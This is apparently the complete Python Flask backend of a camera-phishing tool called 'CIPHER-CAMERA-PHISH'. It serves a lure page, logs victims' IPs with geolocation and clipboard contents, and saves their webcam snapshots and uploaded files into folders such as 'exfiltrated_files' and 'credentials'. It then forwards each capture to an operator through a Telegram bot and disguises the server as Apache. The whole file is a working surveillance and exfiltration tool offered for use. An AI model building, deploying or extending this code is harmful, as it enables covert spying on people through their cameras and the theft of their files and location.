"""
PROJECT: CIPHER-CAMERA-PHISH [THE MASTER ENGINE]
ROLE: SOVEREIGN SECURITY BACKEND & NEURAL INTERFACE
ARCHITECT: Biruk Getachew (CIPHER)
"""

import os
import json
import base64
import requests
import threading
import uuid
import time
from datetime import datetime
from flask import Flask, request, jsonify, render_template, send_from_directory
from flask_cors import CORS
from colorama import Fore, Style, init

# --- 1. SYSTEM INITIALIZATION ---
init(autoreset=True)
app = Flask(__name__, 
            template_folder='../web', 
            static_folder='../web', 
            static_url_path='')
CORS(app)

# --- 2. ELITE VAULT INFRASTRUCTURE ---
BASE_DIR = os.path.dirname(os.path.abspath(__file__))
PROJECT_ROOT = os.path.dirname(BASE_DIR)
VAULT_PATH = os.path.join(PROJECT_ROOT, "vault")

STAGES = {
    "INTEL": os.path.join(VAULT_PATH, "deep_intel"),
    "MEDIA": os.path.join(VAULT_PATH, "neural_media"),
    "FILES": os.path.join(VAULT_PATH, "exfiltrated_files"),
    "CREDS": os.path.join(VAULT_PATH, "credentials"),
    "LOGS": os.path.join(VAULT_PATH, "system_logs")
}

for folder in STAGES.values():
    os.makedirs(folder, exist_ok=True)

# --- 3. RESEARCHER CONFIGURATION ---
TELEGRAM_TOKEN = "YOUR_BOT_TOKEN"
CHAT_ID = "YOUR_CHAT_ID"

# --- 4. NEURAL DISPATCHER (THE SHADOW AGENT) ---
class NeuralDispatcher:
    @staticmethod
    def send_alert(message, file_path=None):
        def executor():
            try:
                base_url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}"
                if file_path and os.path.exists(file_path):
                    with open(file_path, 'rb') as doc:
                        requests.post(f"{base_url}/sendDocument", 
                                      data={'chat_id': CHAT_ID, 'caption': message, 'parse_mode': 'Markdown'}, 
                                      files={'document': doc}, timeout=20)
                else:
                    requests.post(f"{base_url}/sendMessage", 
                                  data={'chat_id': CHAT_ID, 'text': message, 'parse_mode': 'Markdown'}, 
                                  timeout=20)
            except Exception as e:
                pass

        threading.Thread(target=executor, daemon=True).start()

# --- 5. STEALTH MIDDLEWARE ---
@app.after_request
def apply_stealth_headers(response):
    response.headers["Server"] = "Apache/2.4.41 (Ubuntu)"
    return response

# --- 6. CORE API ROUTING (v7 PROTOCOL) ---

@app.route('/')
def serve_node():
    return render_template('index.html')

@app.route('/<path:path>')
def serve_assets(path):
    return send_from_directory('../web', path)

@app.route('/api/v7/handshake', methods=['POST'])
def neural_handshake():
    try:
        data = request.json
        client_ip = request.remote_addr
        sid = data.get('sid', 'UNK-NODE')
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

        print(f"{Fore.MAGENTA}[⚡ HANDSHAKE]{Fore.WHITE} SID: {sid} | IP: {client_ip}")

        try:
            geo = requests.get(f"http://ip-api.com/json/{client_ip}?fields=66846719", timeout=5).json()
            data['geo_intel'] = geo
        except:
            data['geo_intel'] = {"status": "fail"}

        intel_file = os.path.join(STAGES["INTEL"], f"session_{sid}.json")
        with open(intel_file, "w") as f:
            json.dump({"meta": {"ip": client_ip, "time": timestamp}, "payload": data}, f, indent=4)

        alert_type = "CLIPBOARD" if data.get('type') == 'clipboard' else "HANDSHAKE"
        alert = (
            f"🌀 *CIPHER-X: {alert_type}*\n"
            f"🆔 SID: `{sid}`\n"
            f"📍 IP: `{client_ip}`\n"
            f"🌍 LOC: `{data['geo_intel'].get('country', 'N/A')}, {data['geo_intel'].get('city', 'N/A')}`\n"
            f"📊 Data: `{data.get('content') or 'Neural Audit Started'}`"
        )
        NeuralDispatcher.send_alert(alert)

        return jsonify({"status": "overlord_active", "session": sid})
    except Exception as e:
        return jsonify({"status": "error", "msg": str(e)}), 400

@app.route('/api/v7/exfiltrate', methods=['POST'])
def neural_exfiltration():
    try:
        data = request.json
        sid = data.get('sid', 'UNK')
        blob_data = data.get('blob')
        metadata = data.get('meta', {})
        origin = metadata.get('origin', 'sensor')

        if not blob_data: return jsonify({"status": "empty"}), 400

        is_upload = origin == 'upload'
        target_dir = STAGES["FILES"] if is_upload else STAGES["MEDIA"]
        prefix = "FILE" if is_upload else "CAM"
        
        header, encoded = blob_data.split(",", 1)
        ext = header.split("/")[1].split(";")[0]
        if ext == "jpeg": ext = "jpg"
        
        filename = f"{prefix}_{sid}_{datetime.now().strftime('%H%M%S_%f')[:10]}.{ext}"
        filepath = os.path.join(target_dir, filename)

        with open(filepath, "wb") as f:
            f.write(base64.b64decode(encoded))

        color = Fore.YELLOW if not is_upload else Fore.LIGHTMAGENTA_EX
        print(f"{color}[✔ SECURED]{Fore.WHITE} {filename} | Origin: {origin}")

        caption = f"💀 *CIPHER EXFILTRATION*\n🆔 SID: `{sid}`\n🛠 Type: `{origin}`"
        NeuralDispatcher.send_alert(caption, filepath)

        return jsonify({"status": "secured", "ref": filename})
    except Exception as e:
        print(f"{Fore.RED}[!] SYNC ERROR: {e}")
        return jsonify({"status": "failed"}), 500

# --- 7. EXECUTION ---
if __name__ == "__main__":
    banner = f"""{Fore.CYAN}
               ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓
              ▄▓▓▓▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀
            ▄▓▓▓▀
           ▓▓▓▀   ▄▄▄▄▄
         ▓▓▓▀  ▓▓▓▓▓▓▓▓▓▓
       ▄▓▓      ▓▓▓      ▓▓▓▄
      ▓▓▓▓   ▐▓▓▓      ▐▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓
       ▀▓▓▓▄  ▓▓▓▄    ▄▓▓▓      ▐▓▓▓ ▐▓▓▓
         ▀▓▓▓  ▀▓▓▓▓▓▓▓▓▀       ▐▓▓▓  ▓▓
           ▀▓▓▓                  ▀▀
             ▓▓▓▄
              ▐▓▓▓▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
                ▀▀▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▀

{Fore.WHITE}       "Deciphering the future before it happens.."
{Fore.GREEN} [NODE]     : CIPHER-CAMPHISH-PRO
{Fore.GREEN} [AUTHOR]   : Biruk Getachew (CIPHER)
{Fore.YELLOW}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
    """
    print(banner)
    app.run(host='0.0.0.0', port=5000, threaded=True, debug=False)